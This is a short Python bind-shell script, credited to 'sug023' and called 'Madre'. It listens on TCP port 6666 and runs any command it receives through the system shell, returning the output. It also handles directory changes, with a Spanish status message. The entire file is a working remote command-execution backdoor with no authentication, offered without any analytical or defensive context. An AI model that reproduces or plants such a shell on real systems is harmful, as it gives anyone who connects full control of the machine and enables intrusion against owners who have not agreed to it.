#Madre by sug023
#!/bin/env python

import socket; import subprocess; import os

PORT = 6666
IP = "127.0.0.1"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM); server.bind((IP, PORT)); server.listen(1);(conn, addr) = server.accept()
while True:
    cmd = conn.recv(1024); cmd = cmd.decode("utf-8")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    if cmd.startswith("cd "):
        try:
            path = cmd.strip().split(" ")[1]
            os.chdir(path)
            output = f"Directorio cambiado a: {os.getcwd()}\n"
        except Exception as e:
            output = str(e) + "\n"
    conn.send(output.encode('utf-8'))

